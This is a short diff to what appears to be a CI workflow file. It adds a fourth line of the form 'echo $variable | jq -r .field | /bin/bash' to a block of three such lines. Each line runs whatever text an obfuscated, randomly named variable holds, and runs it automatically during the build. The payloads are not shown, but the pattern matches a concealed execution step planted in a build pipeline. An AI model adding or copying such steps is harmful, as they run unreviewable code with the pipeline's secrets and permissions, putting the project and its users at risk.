@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$dbu0" | jq -r .uwv7 | /bin/bash
           echo $zhf1 | jq -r .qe4 | /bin/bash
           echo $ysa5 | jq -r .jrzjd7 | /bin/bash
+          echo $fx91260 | jq -r .ni24549 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
